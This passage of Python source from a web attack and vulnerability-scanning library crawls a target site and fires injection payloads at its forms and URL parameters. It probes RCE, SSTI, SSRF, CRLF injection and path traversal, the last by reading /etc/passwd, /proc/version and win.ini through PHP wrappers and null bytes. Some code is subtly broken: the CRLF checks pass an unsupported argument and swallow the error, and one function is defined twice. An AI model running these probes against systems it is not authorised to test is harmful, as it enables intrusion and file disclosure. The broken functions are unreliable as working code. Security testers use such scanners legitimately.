                                parsed_form = set_up_injection(
                                    target_page,
                                    form_index,
                                    i,
                                    xp,
                                    cookie,
                                    setup_ua(user_agent),
                                    setup_proxy(proxy, proxies),
                                    timeout,
                                    fill_empty,
                                    file_extension=file_extension,
                                    number=number,
                                    email_extension=email_extension,
                                    phone_pattern=phone_pattern,
                                    leave_empty=leave_empty,
                                    dont_send=dont_send,
                                    mime_type=mime_type,
                                    predefined_inputs=predefined_inputs,
                                    dont_change=dont_change,
                                )
                                _res = rce_submit(
                                    parsed_form,
                                    xp,
                                    based_on,
                                    replaceble_parameters,
                                    debug=debug,
                                    enctype=l1["enctype"],
                                    type_injection=list(injection.keys())[0],
                                )
                                if _res[0] == True:
                                    x = "parameter: '" + i + "' => [+] Vulnerable !!"
                                    vul.append({'parameter':i, 'context': _res[1]})
                                    colr = Fore.GREEN
                                else:
                                    x = "parameter: '" + i + "' => [-] Not Vulnerable"
                                    #sec.append(i)
                                    colr = Fore.RED
                                if _res[2] == True:
                                    x+=Fore.YELLOW+"\n[i] SQL Error detected"
                                    sql_e.append({'parameter':i, 'p_o_c': _res[-1]})
                                if _res[3]==True:
                                    x+=Fore.YELLOW+"\n[i] XML parsing Error detected"
                                    xml_e.append({'parameter':i, 'p_o_c': _res[-1]})
                                if _res[4] == True:
                                    x+=Fore.YELLOW+"\n[i] Fetching URL Error detected (potential SSRF)"
                                    ssrf_e.append({'parameter':i, 'p_o_c': _res[-1]})
                                if _res[5] == True:
                                    x+=Fore.YELLOW+"\n[i] Reading file Error detected (potential path traversal)"
                                    p_t_e.append({'parameter':i, 'p_o_c': _res[-1]})
                                if logs == True:
                                    print(colr + x + Style.RESET_ALL)
                        except Exception as ex:
                            pass#raise(ex)
            dic.append(
                {
                    "action": u,
                    "method": l1["method"],
                    "vulnerable": vul,
                    #"safe": sec,
                    "sql_errors":sql_e,
                    "xml_parsing_errors":xml_e,
                    "fetching_url_errors":ssrf_e,
                    "reading_file_errors":p_t_e
                }
            )
        if based_on_o == "time":
            final = {
                "payload": xp.replace(
                    " {} ".format(int(delay) + 2), " {} ".format(int(delay))
                ),
                "based_on": based_on_o,
                "injection": injection,
                "page": target_page,
                "result": dic,
            }
        else:
            final = {
                "payload": xp,
                "based_on": based_on_o,
                "injection": injection,
                "page": target_page,
                "result": dic,
            }
        if save_to_file:
            with open(save_to_file.split(".")[0] + ".json", "w") as outfile:
                json.dump(final, outfile, indent=4)
            outfile.close()
        return final



def rce(
    u,
    max_pages=5,
    pages=[],
    payload_index=0,
    email_extension='@gmail.com',
    phone_pattern='XXX-XXX-XXXX',
    save_to_file=None,
    dont_change={},
    number=(1, 9),
    injection={"code": "php"},
    code_operator_right="; ",
    code_operator_left="",
    command_operator_right="|",
    command_operator_left="&",
    sql_operator_right="or '",
    sql_operator_left="' or ",
    file_extension="png",
    replaceble_parameters={"phpvalue": ((".", ""),)},
    based_on="time",
    delay=10,
    logs=True,
    fill_empty=10,
    leave_empty=[],
    dont_send=["btnClear"],
    proxy=None,
    proxies=None,
    timeout=120,
    user_agent=None,
    cookie=None,
    debug=False,
    mime_type=None,
    predefined_inputs={},
):
    l=[]
    if pages==[]:
        pages=spider_url(u,cookie=cookie,max_pages=max_pages,timeout=timeout,user_agent=user_agent,proxy=proxy)
    for x in pages:
        if logs==True:
            print('\n\nPage: {}\n'.format(x))
        l.append(rce_forms(x,
                            payload_index=payload_index,
                            save_to_file=save_to_file,
                            dont_change=dont_change,
                            number=number,
                            email_extension=email_extension,
                            phone_pattern=phone_pattern,
                            injection=injection,
                            code_operator_right=code_operator_right,
                            code_operator_left=code_operator_left,
                            command_operator_right=command_operator_right,
                            command_operator_left=command_operator_left,
                            sql_operator_right=sql_operator_right,
                            sql_operator_left=sql_operator_left,
                            file_extension=file_extension,
                            replaceble_parameters=replaceble_parameters,
                            based_on=based_on,
                            delay=delay,
                            logs=logs,
                            fill_empty=fill_empty,
                            leave_empty=leave_empty,
                            dont_send=dont_send,
                            proxy=proxy,
                            proxies=proxies,
                            timeout=timeout,
                            user_agent=user_agent,
                            cookie=cookie,
                            debug=debug,
                            mime_type=mime_type,
                            predefined_inputs=predefined_inputs))
    f=[]
    for x in l:
        if x !=None:
            n=x.copy()
            n['result']=[]
            for i in x['result']:
                if len(i['vulnerable']) > 0 or len(i['sql_errors']) > 0 or len(i['xml_parsing_errors'])>0 or len(i['fetching_url_errors'])>0 or len(i['reading_file_errors']) > 0:
                    n['result'].append(i)
            if n['result']!=[]:
                f.append(n)
    return f




def ssti_submit(
    parsed,
    payload,
    replaceble_parameters,
    debug=False,
    enctype="application/x-www-form-urlencoded",
    eval_value=1111111101,
):
    """"""
    p_o_c=parsed[0].copy()
    d, fi = setup_to_submit(parsed[0])
    for x in d:
        for y in replaceble_parameters:
            if x == y:
                for z in replaceble_parameters[y]:
                    d[x] = d[x].replace(z[0], z[1])
    if debug == True:
        for x in d:
            print("{}{} : {}{}".format(Fore.MAGENTA, x, Fore.WHITE, d[x]))
        for x in fi:
            print("{}{} : {}{}".format(Fore.MAGENTA, x, Fore.WHITE, fi[x]))
    if "application/json" in enctype:
        d = json.dumps(d)
    if not fi:
        parsed[1].update(
            {
                "Content-Type": enctype,
                "Referer": parsed[0]["action"],
                "Origin": parsed[0]["action"].split("://")[0]
                + "://"
                + parsed[0]["action"].split("://")[1].split("/")[0],
            }
        )
    else:
        parsed[1].update(
            {
                "Referer": parsed[0]["action"],
                "Origin": parsed[0]["action"].split("://")[0]
                + "://"
                + parsed[0]["action"].split("://")[1].split("/")[0],
            }
        )
    c=''
    if parsed[0]["method"] == "get":
        try:
            c = requests.get(
                parsed[0]["action"],
                params=d,
                headers=parsed[1],
                proxies=parsed[2],
                timeout=parsed[3],
                verify=False,
            ).text
            if "{}".format(eval_value) in c:
                return (True, {"p_o_c":p_o_c,"payload":payload, "result":"{}".format(eval_value)},any(s in c for s in sql_errors),any(s in c for s in xml_parser_errors),any(s in c for s in fetch_url_errors),any(s in c for s in open_file_errors),p_o_c)
        except Exception as e:
            pass
    else:
        try:
            c = requests.post(
                parsed[0]["action"],
                data=d,
                files=fi,
                headers=parsed[1],
                proxies=parsed[2],
                timeout=parsed[3],
                verify=False,
            ).text
            if "{}".format(eval_value) in c:
                return (True, {"p_o_c":p_o_c,"payload":payload, "result":"{}".format(eval_value)},any(s in c for s in sql_errors),any(s in c for s in xml_parser_errors),any(s in c for s in fetch_url_errors),any(s in c for s in open_file_errors),p_o_c)
        except Exception as e:
            pass
    return (False, "",any(s in c for s in sql_errors),any(s in c for s in xml_parser_errors),any(s in c for s in fetch_url_errors),any(s in c for s in open_file_errors),p_o_c)


def safe_eval(a, o, b):
    if a.strip().isnumeric() == False or b.strip().isnumeric() == False:
        raise Exception("For security reasons, ONLY NUMERIC VALUES ARE EVALUATED !!")
    if o.strip() not in ["+", "-", "*", "/"]:
        raise Exception(
            "For security reasons, ONLY OPERATORS ALLOWED ARE: + , - , * , /!!"
        )
    return eval(a + o + b)


def ssti_forms(
    u,
    payload_index=0,
    values=(9, 123456789),
    email_extension='@gmail.com',
    phone_pattern='XXX-XXX-XXXX',
    dont_change={},
    number=(1, 9),
    payload_keyword="payload",
    operator="*",
    save_to_file=None,
    file_extension="png",
    replaceble_parameters={"phpvalue": ((".", ""),)},
    logs=True,
    fill_empty=10,
    leave_empty=[],
    dont_send=["btnClear"],
    proxy=None,
    proxies=None,
    timeout=120,
    user_agent=None,
    cookie=None,
    debug=False,
    mime_type=None,
    predefined_inputs={},
):
    """
    this function is for SSTI test with both POST and GET requests. it extracts the input fields names using the "inputs" function then test each input using POST and GET methods.
    usage:

    >>>import bane
    >>>bane.ssti_forms('http://phptester.net/")
    """
    target_page = u
    xp = ssti_list[payload_index].replace(
        payload_keyword, "{}{}{}".format(values[0], operator, values[1])
    )
    xp_eval = safe_eval("{}".format(values[0]), operator, "{}".format(values[1]))
    target_page = u
    form_index = -1
    if proxy:
        proxy = proxy
    if proxies:
        proxy = random.choice(proxies)
    dic = []
    if logs == True:
        print(Fore.WHITE + "[~]Getting forms..." + Style.RESET_ALL)
    hu = True
    fom = forms_parser(
        u, proxy=proxy, timeout=timeout, cookie=cookie, user_agent=user_agent,include_links=True
    )
    if len(fom) == 0:
        if logs == True:
            print(Fore.RED + "[-]No forms were found!!!" + Style.RESET_ALL)
        hu = False
    if hu == True:
        for l1 in fom:
            form_index += 1
            lst = {}
            vul = []
            sec = []
            sql_e=[]
            xml_e=[]
            p_t_e=[]
            ssrf_e=[]
            hu = True
            u = l1["action"]
            if logs == True:
                print(
                    Fore.BLUE
                    + "Form: "
                    + Fore.WHITE
                    + str(form_index)
                    + Fore.BLUE
                    + "\nAction: "
                    + Fore.WHITE
                    + u
                    + Fore.BLUE
                    + "\nMethod: "
                    + Fore.WHITE
                    + l1["method"]
                    + Fore.BLUE
                    + "\nPayload: "
                    + Fore.WHITE
                    + xp
                    + Style.RESET_ALL
                )
                """if len(inputs(u,proxy=proxy,timeout=timeout,value=True,cookie=cookie,user_agent=user_agent))==0:
     if logs==True:
      print(Fore.YELLOW+"[-]No parameters found on that page !! Moving on.."+Style.RESET_ALL)"""
            if True:
                extr = []
                l = []
                for x in l1["inputs"]:
                    if (
                        x["name"].strip() not in leave_empty
                        and x["name"].strip() not in dont_send
                    ):
                        try:
                            if (
                                x["type"]
                                in [
                                    "hidden",
                                    "file",
                                    "text",
                                    "textarea",
                                    "email",
                                    "tel",
                                    "search",
                                    "url",
                                    "password",
                                    "number",
                                    "select",
                                    "radio",
                                    "checkbox",
                                    "color"
                                ]
                                and x["name"] not in dont_change
                            ):  # any input type that accept direct input from keyboard
                                i = x["name"]
                                parsed_form = set_up_injection(
                                    target_page,
                                    form_index,
                                    i,
                                    xp,
                                    cookie,
                                    setup_ua(user_agent),
                                    setup_proxy(proxy, proxies),
                                    timeout,
                                    fill_empty,
                                    file_extension=file_extension,
                                    number=number,
                                    email_extension=email_extension,
                                    phone_pattern=phone_pattern,
                                    leave_empty=leave_empty,
                                    dont_send=dont_send,
                                    mime_type=mime_type,
                                    predefined_inputs=predefined_inputs,
                                    dont_change=dont_change,
                                )
                                _res = ssti_submit(
                                    parsed_form,
                                    xp,
                                    replaceble_parameters,
                                    debug=debug,
                                    enctype=l1["enctype"],
                                    eval_value=xp_eval,
                                )
                                if _res[0] == True:
                                    x = "parameter: '" + i + "' => [+] Vulnerable !!"
                                    vul.append({'parameter':i, 'context':_res[1]})
                                    colr = Fore.GREEN
                                else:
                                    x = "parameter: '" + i + "' => [-] Not Vulnerable"
                                    #sec.append(i)
                                    colr = Fore.RED
                                if _res[2] == True:
                                    x+=Fore.YELLOW+"\n[i] SQL Error detected"
                                    sql_e.append({'parameter':i, 'p_o_c': _res[-1]})
                                if _res[3]==True:
                                    x+=Fore.YELLOW+"\n[i] XML parsing Error detected"
                                    xml_e.append({'parameter':i, 'p_o_c': _res[-1]})
                                if _res[4] == True:
                                    x+=Fore.YELLOW+"\n[i] Fetching URL Error detected (potential SSRF)"
                                    ssrf_e.append({'parameter':i, 'p_o_c': _res[-1]})
                                if _res[5] == True:
                                    x+=Fore.YELLOW+"\n[i] Reading file Error detected (potential path traversal)"
                                    p_t_e.append({'parameter':i, 'p_o_c': _res[-1]})
                                if logs == True:
                                    print(colr + x + Style.RESET_ALL)
                        except Exception as ex:
                            break
            dic.append(
                {
                    "action": u,
                    "method": l1["method"],
                    "vulnerable": vul,
                    #"safe": sec,
                    "sql_errors":sql_e,
                    "xml_parsing_errors":xml_e,
                    "fetching_url_errors":ssrf_e,
                    "reading_file_errors":p_t_e
                }
            )
        final = {"payload": xp, "page": target_page, "result": dic}
        if save_to_file:
            with open(save_to_file.split(".")[0] + ".json", "w") as outfile:
                json.dump(final, outfile, indent=4)
            outfile.close()
        return final

def ssti(
    u,
    max_pages=5,
    pages=[],
    email_extension='@gmail.com',
    phone_pattern='XXX-XXX-XXXX',
    payload_index=0,
    values=(9, 123456789),
    dont_change={},
    number=(1, 9),
    payload_keyword="payload",
    operator="*",
    save_to_file=None,
    file_extension="png",
    replaceble_parameters={"phpvalue": ((".", ""),)},
    logs=True,
    fill_empty=10,
    leave_empty=[],
    dont_send=["btnClear"],
    proxy=None,
    proxies=None,
    timeout=120,
    user_agent=None,
    cookie=None,
    debug=False,
    mime_type=None,
    predefined_inputs={},
):
    l=[]
    if pages==[]:
        pages=spider_url(u,cookie=cookie,max_pages=max_pages,timeout=timeout,user_agent=user_agent,proxy=proxy)
    for x in pages:
        if logs==True:
            print('\n\nPage: {}\n'.format(x))
        l.append(ssti_forms(x,
                            payload_index=payload_index,
                            values=values,
                            email_extension=email_extension,
                            phone_pattern=phone_pattern,
                            dont_change=dont_change,
                            number=number,
                            payload_keyword=payload_keyword,
                            operator=operator,
                            save_to_file=save_to_file,
                            file_extension=file_extension,
                            replaceble_parameters=replaceble_parameters,
                            logs=logs,
                            fill_empty=fill_empty,
                            leave_empty=leave_empty,
                            dont_send=dont_send,
                            proxy=proxy,
                            proxies=proxies,
                            timeout=timeout,
                            user_agent=user_agent,
                            cookie=cookie,
                            debug=debug,
                            mime_type=mime_type,
                            predefined_inputs=predefined_inputs))
    f=[]
    for x in l:
        if x !=None:
            n=x.copy()
            n['result']=[]
            for i in x['result']:
                if len(i['vulnerable']) > 0 or len(i['sql_errors']) > 0 or len(i['xml_parsing_errors'])>0 or len(i['fetching_url_errors'])>0 or len(i['reading_file_errors']) > 0:
                    n['result'].append(i)
            if n['result']!=[]:
                f.append(n)
    return f




def valid_parameter(parm):
    try:
        float(parm)
        return False
    except:
        return True


def path_traversal_check(
    u,
    php_wrapper="file",
    linux_file=0,
    null_byte=False,
    bypass=False,
    target_os="linux",
    proxy=None,
    proxies=None,
    timeout=10,
    user_agent=None,
    cookie=None,
):
    """
    this function is for FI vulnerability test using a link"""
    linux_files = ["{}proc{}version", "{}etc{}passwd"]
    if proxies:
        proxy = random.choice(proxies)
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    if cookie:
        heads = {"User-Agent": us, "Cookie": cookie}
    else:
        heads = {"User-Agent": us}
    heads.update(
        {
            "Referer": u,
            "Origin": u.split("://")[0] + "://" + u.split("://")[1].split("/")[0],
        }
    )
    if "=" not in u:
        return (False, "")
    else:
        if target_os.lower() == "linux":
            l = linux_files[linux_file]
        else:
            l = "c:{}windows{}win.ini"
        if bypass == True:
            l = l.format("./" * random.randint(1, 5), "./" * random.randint(1, 5))
        else:
            l = l.format("/" * random.randint(1, 5), "/" * random.randint(1, 5))
        if php_wrapper:
            l = (
                "".join(random.choice((str.upper, str.lower))(c) for c in php_wrapper)
                + "://"
                + l
            )
        if null_byte == True:
            l += "%00"
        try:
            r = requests.get(
                u.format(l), headers=heads, proxies=proxy, timeout=timeout, verify=False
            )
            if (
                (
                    len(
                        re.findall(
                            r"[a-zA-Z0-9_]*:[a-zA-Z0-9_]*:[\d]*:[\d]*:[a-zA-Z0-9_]*:/",
                            r.text,
                        )
                    )
                    > 0
                )
                or (
                    all(
                        x in r.text
                        for x in [
                            "; for 16-bit app support",
                            "[fonts]",
                            "[extensions]",
                            "[mci extensions]",
                            "[files]",
                            "[Mail]",
                        ]
                    )
                    == True
                )
                or (all(x in r.text for x in ["Linux version", "(gcc version"]) == True)
            ):
                return (True, r.url)
        except Exception as e:
            pass
    return (False, "")


def path_traversal_urls(
    u,
    null_byte=False,
    bypass=False,
    target_os="linux",
    php_wrapper="file",
    proxy=None,
    proxies=None,
    timeout=10,
    user_agent=None,
    cookie=None,
):
    res = []
    if u.split("?")[0][-1] != "/" and "." not in u.split("?")[0].rsplit("/", 1)[-1]:
        u = u.replace("?", "/?")
    a = crawl(u, proxy=proxy, timeout=timeout, cookie=cookie, user_agent=user_agent)
    l = []
    d = a.values()
    for x in d:
        if len(x[3]) > 0:
            l.append(x)
    o = []
    for x in l:
        ur = x[1]
        if ur.split("?")[0] not in o:
            o.append(ur.split("?")[0])
            if (
                ur.split("?")[0][-1] != "/"
                and "." not in ur.split("?")[0].rsplit("/", 1)[-1]
            ):
                ur = ur.replace("?", "/?")
            for y in x[3]:
                if valid_parameter(y[1]) == True:
                    trgt = ur.replace(y[0] + "=" + y[1], y[0] + "={}")
                    q = path_traversal_check(
                        trgt,
                        null_byte=null_byte,
                        bypass=bypass,
                        linux_file=0,
                        target_os="linux",
                        php_wrapper=php_wrapper,
                        proxy=proxy,
                        proxies=proxies,
                        timeout=timeout,
                        cookie=cookie,
                        user_agent=user_agent,
                    )
                    if q[0] == True:
                        if q[1] not in res:
                            res.append(q[1])
                    else:
                        q = path_traversal_check(
                            trgt,
                            null_byte=null_byte,
                            bypass=bypass,
                            linux_file=1,
                            target_os="linux",
                            php_wrapper=php_wrapper,
                            proxy=proxy,
                            proxies=proxies,
                            timeout=timeout,
                            cookie=cookie,
                            user_agent=user_agent,
                        )
                        if q[0] == True:
                            if q[1] not in res:
                                res.append(q[1])
                        else:
                            q = path_traversal_check(
                                trgt,
                                null_byte=null_byte,
                                bypass=bypass,
                                php_wrapper=php_wrapper,
                                proxy=proxy,
                                proxies=proxies,
                                timeout=timeout,
                                cookie=cookie,
                                user_agent=user_agent,
                                target_os="windows",
                            )
                            if q[0] == True:
                                if q[1] not in res:
                                    res.append(q[1])
    return res

def path_traversal(
    u,
    max_pages=5,
    logs=True,
    null_byte=False,
    bypass=False,
    target_os="linux",
    php_wrapper=None,#"file",
    proxy=None,
    proxies=None,
    timeout=10,
    user_agent=None,
    cookie=None,
    pages=[]
):
    l=[]
    if pages==[]:
        pages=spider_url(u,cookie=cookie,max_pages=max_pages,timeout=timeout,user_agent=user_agent,proxy=proxy)
    for x in pages:
        if logs==True:
            print('\n\nPage: {}\n'.format(x))
        result=path_traversal_urls(x,
                            null_byte=null_byte,
                            bypass=bypass,
                            target_os=target_os,
                            php_wrapper=php_wrapper,
                            proxy=proxy,
                            proxies=proxies,
                            timeout=timeout,
                            user_agent=user_agent,
                            cookie=cookie)
        if logs==True:
            for r in result:
                print(r)
        l.append({'page':x,'result':result})
    return  [x for x in l if x['result']!=[]]




def ssrf_check(
    u,
    null_byte=False,
    link="http://www.google.com",
    signature="<title>Google</title>",
    proxy=None,
    proxies=None,
    timeout=25,
    user_agent=None,
    cookie=None,
):
    """
    this function is for FI vulnerability test using a link"""
    l = link
    if proxies:
        proxy = random.choice(proxies)
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    if cookie:
        heads = {"User-Agent": us, "Cookie": cookie}
    else:
        heads = {"User-Agent": us}
    heads.update(
        {
            "Referer": u,
            "Origin": u.split("://")[0] + "://" + u.split("://")[1].split("/")[0],
        }
    )
    if "=" not in u:
        return (False, "")
    if null_byte == True:
        l += "%00"
    try:
        r = requests.get(
            u.format(l), headers=heads, proxies=proxy, timeout=timeout, verify=False
        )
        if (signature in r.text) or (r.status_code == 504):
            return (True, r.url)
    except Exception as e:
        if "Read timed out" in str(e):
            return (True, u.format(l))
    return (False, "")


def ssrf_urls(
    u,
    null_byte=False,
    link="http://www.google.com",
    timeout=120,
    signature="<title>Google</title>",
    proxy=None,
    proxies=None,
    user_agent=None,
    cookie=None,
):
    res = []
    if u.split("?")[0][-1] != "/" and "." not in u.split("?")[0].rsplit("/", 1)[-1]:
        u = u.replace("?", "/?")
    a = crawl(u, proxy=proxy, timeout=timeout, cookie=cookie, user_agent=user_agent)
    l = []
    d = a.values()
    for x in d:
        if len(x[3]) > 0:
            l.append(x)
    o = []
    for x in l:
        ur = x[1]
        if ur.split("?")[0] not in o:
            o.append(ur.split("?")[0])
            if (
                ur.split("?")[0][-1] != "/"
                and "." not in ur.split("?")[0].rsplit("/", 1)[-1]
            ):
                ur = ur.replace("?", "/?")
            for y in x[3]:
                if valid_parameter(y[1]) == True:
                    trgt = ur.replace(y[0] + "=" + y[1], y[0] + "={}")
                    q = ssrf_check(
                        trgt,
                        null_byte=null_byte,
                        proxy=proxy,
                        link=link,
                        signature=signature,
                        proxies=proxies,
                        timeout=timeout,
                        cookie=cookie,
                        user_agent=user_agent,
                    )
                    if q[0] == True:
                        if q[1] not in res:
                            res.append(q[1])
    return res

def ssrf(
    u,
    max_pages=5,
    logs=True,
    null_byte=False,
    link="http://www.google.com",
    timeout=120,
    signature="<title>Google</title>",
    proxy=None,
    proxies=None,
    user_agent=None,
    cookie=None,
    pages=[]
):
    l=[]
    if pages==[]:
        pages=spider_url(u,cookie=cookie,max_pages=max_pages,timeout=timeout,user_agent=user_agent,proxy=proxy)
    for x in pages:
        if logs==True:
            print('\n\nPage: {}\n'.format(x))
        result=ssrf_urls(x,
                        null_byte=null_byte,
                        link=link,
                        timeout=timeout,
                        signature=signature,
                        proxy=proxy,
                        proxies=proxies,
                        user_agent=user_agent,
                        cookie=cookie)
        if logs==True:
            for r in result:
                print(r)
        l.append({'page':x,'result':result})
    return  [x for x in l if x['result']!=[]]



def ssrf(
    u,
    max_pages=5,
    logs=True,
    null_byte=False,
    link="http://www.google.com",
    timeout=120,
    signature="<title>Google</title>",
    proxy=None,
    proxies=None,
    user_agent=None,
    cookie=None,
    pages=[]
):
    l=[]
    if pages==[]:
        pages=spider_url(u,cookie=cookie,max_pages=max_pages,timeout=timeout,user_agent=user_agent,proxy=proxy)
    for x in pages:
        if logs==True:
            print('\n\nPage: {}\n'.format(x))
        result=ssrf_urls(x,
                        null_byte=null_byte,
                        link=link,
                        timeout=timeout,
                        signature=signature,
                        proxy=proxy,
                        proxies=proxies,
                        user_agent=user_agent,
                        cookie=cookie)
        if logs==True:
            for r in result:
                print(r)
        l.append({'page':x,'result':result})
    return  [x for x in l if x['result']!=[]]



def sniffable_links(u, proxy=None, timeout=10, user_agent=None, cookie=None,content=None,logs=True,request_headers=None):
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    if cookie:
        heads = {"User-Agent": us, "Cookie": cookie}
    else:
        heads = {"User-Agent": us}
    vul=[]
    try:
        if content==None:
            r=requests.get(u,headers=heads,timeout=timeout,verify=False,proxies=proxy)
            for x in r.headers:
                    if x.lower().strip() == "strict-transport-security":
                        if logs == True:
                            print("\n[-] Not vulnerable: Strict-Transport-Security is set")
                        return []
            soup = BeautifulSoup(r.content, 'html.parser')
        else:
            soup = BeautifulSoup(content, 'html.parser')
            if request_headers!=None:
                for x in request_headers:
                    if x.lower().strip() == "strict-transport-security":
                        if logs == True:
                            print("\n[-] Not vulnerable: Strict-Transport-Security is set")
                        return []
        if u:
                parsed_url = urlparse(u)
                if parsed_url.netloc == urlparse(u).netloc:
                    if parsed_url.scheme != 'https' and parsed_url.geturl().startswith('//')==False:
                        parsed_url=parsed_url.geturl()
                        if parsed_url not in vul:
                            vul.append(parsed_url)
                            if logs==True:
                                print('\t[+] Vulnerable : {}'.format(parsed_url))
        media_elements=soup.find_all(['img', 'audio', 'video', 'source','embed', 'script', 'link', 'a'])
        for element in media_elements:
            src_or_href = element.get('src') or element.get('href')
            if src_or_href:
                parsed_url = urlparse(urljoin(u,src_or_href))
                if parsed_url.netloc == urlparse(u).netloc:
                    if parsed_url.scheme != 'https' and parsed_url.geturl().startswith('//')==False:
                        parsed_url=parsed_url.geturl()
                        if parsed_url not in vul:
                            vul.append(parsed_url)
                            if logs==True:
                                print('\t[+] Vulnerable : {}'.format(parsed_url))
    except Exception as ex:
        return vul
    return vul
    

def interceptable_links(
    u, 
    max_pages=5,
    proxy=None,
    timeout=10,
    user_agent=None,
    cookie=None,
    content=None,
    logs=True,
    pages=[]
):
    l=[]
    if pages==[]:
        pages=spider_url(u,cookie=cookie,max_pages=max_pages,timeout=timeout,user_agent=user_agent,proxy=proxy)
    for x in pages:
        if logs==True:
            print('\n\nPage: {}\n'.format(x))
        result=sniffable_links(x,
                        proxy=proxy,
                        timeout=timeout,
                        user_agent=user_agent, 
                        cookie=cookie,
                        content=content,
                        logs=logs,
                        )
        if logs==True:
            for r in result:
                print(r)
        l.append({'page':x,'result':result})
    return  [x for x in l if x['result']!=[]]



def page_clickjacking(u, proxy=None, timeout=10, user_agent=None, cookie=None, logs=False,request_headers=None):
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    if cookie:
        heads = {"User-Agent": us, "Cookie": cookie}
    else:
        heads = {"User-Agent": us}
    try:
        if request_headers==None:
            r = requests.get(
                u, headers=heads, proxies=proxy, timeout=timeout, verify=False
            ).headers
        else:
            r=request_headers
        click = True
        for x in r:
            if x.lower().strip() == "x-frame-options":
                click = False
            if logs == True:
                print(x + " : " + r[x])
    except:
        return False
    return click



def set_requests(
    u, method="GET", data={}, files={}, params={}, headers={}, proxy={}, timeout=15
):
    s = requests.Session()
    req = requests.Request(
        method=method, url=u, headers=headers, data=data, files=files, params=params
    )
    prep = req.prepare()
    prep.url = u
    return s.send(prep, verify=False, proxies=proxy, timeout=timeout)


def crlf_unicode_encode(
    random_level=0, line_feed_only=False, carriage_return_only=False
):
    if line_feed_only == False and carriage_return_only == False:
        if random_level == 1:
            return random.choice(["%E5%98%8D", "%0d"]) + random.choice(
                ["%E5%98%8A", "%0a"]
            )
        if random_level == 2:
            return "%E5%98%8D%E5%98%8A"
        else:
            return "%0d%0a"
    else:
        if line_feed_only == True and carriage_return_only == False:
            if random_level == 1:
                return random.choice(["%E5%98%8A", "%0a"])
            if random_level == 2:
                return "%E5%98%8A"
            else:
                return "%0a"
        if carriage_return_only == True and line_feed_only == False:
            if random_level == 1:
                return random.choice(["%E5%98%8D", "%0d"])
            if random_level == 2:
                return "%E5%98%8D"
            else:
                return "%0d"
    return "%0d%0a"


def crlf_header_injection(
    u,
    unicode_random_level=0,
    carriage_return_only=False,
    line_feed_only=False,
    proxy=None,
    timeout=10,
    user_agent=None,
    cookie=None,
    debug=False,
):
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    if cookie:
        heads = {"User-Agent": us, "Cookie": cookie}
    else:
        heads = {"User-Agent": us}
    try:
        r = set_requests(
            u
            + crlf_unicode_encode(
                random_level=unicode_random_level,
                carriage_return_only=carriage_return_only,
            )
            + "banetest:%20test",
            method="GET",
            headers=heads,
            proxy=proxy,
            timeout=timeout,
            verify=False,
        )
        return "banetest" in r.headers
    except Exception as e:
        pass
    return False


def crlf_body_injection(
    u,
    proxy=None,
    unicode_random_level=0,
    carriage_return_only=False,
    line_feed_only=False,
    timeout=10,
    user_agent=None,
    cookie=None,
    debug=False,
):
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    if cookie:
        heads = {"User-Agent": us, "Cookie": cookie}
    else:
        heads = {"User-Agent": us}
    try:
        r = set_requests(
            u
            + crlf_unicode_encode(
                random_level=unicode_random_level,
                carriage_return_only=carriage_return_only,
            )
            + crlf_unicode_encode(
                random_level=unicode_random_level,
                carriage_return_only=carriage_return_only,
            )
            + "banetest:%20test",
            method="GET",
            headers=heads,
            proxy=proxy,
            timeout=timeout,
            verify=False,
        )
        return "banetest;$@*" in r.text
    except Exception as e:
        pass
    return False


def scan_backend_technology(u, proxy=None, timeout=10, user_agent=None, cookie=None, logs=True,request_headers=None):
    domain=u.split('://')[1].split('/')[0].split(':')[0]
    root_domain=extract_root_domain(domain)
    ip=socket.gethostbyname(domain.split(':')[0])
    if user_agent:
        us = user_agent
    else:
        us = random.choice(ua)
    if cookie:
        heads = {"User-Agent": us, "Cookie": cookie}
    else:
        heads = {"User-Agent": us}
    try:
        if request_headers==None:
            r = requests.get(
                u, headers=heads, proxies=proxy, timeout=timeout, verify=False
            ).headers
        else:
            r=request_headers
        server=r.get('Server','')
        try:
            server_os=[x for x in server.split() if x.startswith('(')==True][0].replace('(','').replace(')','')
        except:
            server_os=''
        backend=r.get('X-Powered-By','')
        if logs==True:
            print("Site info:\n\n\tURL: {}\n\tDomain: {}\n\tRoot domain: {}\n\tIP: {}\n\tServer: {}\n\tOS: {}\n\tBackend technology: {}\n".format(u,domain,root_domain,ip,server,server_os,backend))
        backend_technology_exploits={}
        if backend!='':
            bk=[]
            for back in backend.split():
                if logs==True:
                    print('[i] looking for exploits for : {}\n'.format(back))
                if '/' not in back:
                    if logs==True:
                        print('\t[-] unknown version\n')
                else:
                    bk=vulners_search(back.split('/')[0].lower(),version=back.split('/')[1])
                for x in bk:
                    for i in ['cpe', 'cpe23', 'cwe', 'affectedSoftware']:
                        try:
                            del x[i]
                        except:
                            pass
                backend_technology_exploits.update({back:bk})
                if logs==True:
                    if len(bk)==0:
                        print('\t[-] none was found')
                    else:
                        for x in bk:
                            print("\tTitle : {}\n\tDescription: {}\n\tLink: {}".format(x['title'],x['description'],x['href']))
                            print()
        server_exploits={}
        if server!='':
            for sv in server.split():
                if sv.startswith('(')==False:
                    sv_e=[]
                    if logs==True:
                        print('[i] looking for exploits for : {}\n'.format(sv))
                    if '/' in sv:
                        sv_e=vulners_search(sv.split('/')[0].lower(),version=sv.split('/')[1])
                    else:
                        if logs==True:
                            print('\t[-] unknown version\n')
                    for x in sv_e:
                        for i in ['cpe', 'cpe23', 'cwe', 'affectedSoftware']:
                            try:
                                del x[i]
                            except:
                                pass
                    server_exploits.update({sv:sv_e})
                    if logs==True:
                        if len(sv_e)==0:
                            print('\t[-] none was found')
                        else:
                            for x in sv_e:
                                print("\tTitle : {}\n\tDescription: {}\n\tLink: {}".format(x['title'],x['description'],x['href']))
                                print()        
    except Exception as e:
        return {}
    return {'server_exploits':server_exploits,'backend_technology_exploits':backend_technology_exploits}




def csrf_filter_tokens(u, proxy=None, timeout=10, user_agent=None, cookie=None):
    if not cookie or len(cookie.strip()) == 0:
        raise Exception(
            "This attack requires authentication !! You need to set a Cookie"
        )
    res = {"Vulnerable": [], "Safe": []}
    f = forms_parser(
        u, timeout=timeout, user_agent=user_agent, cookie=cookie, proxy=proxy
    )
    f1 = forms_parser(
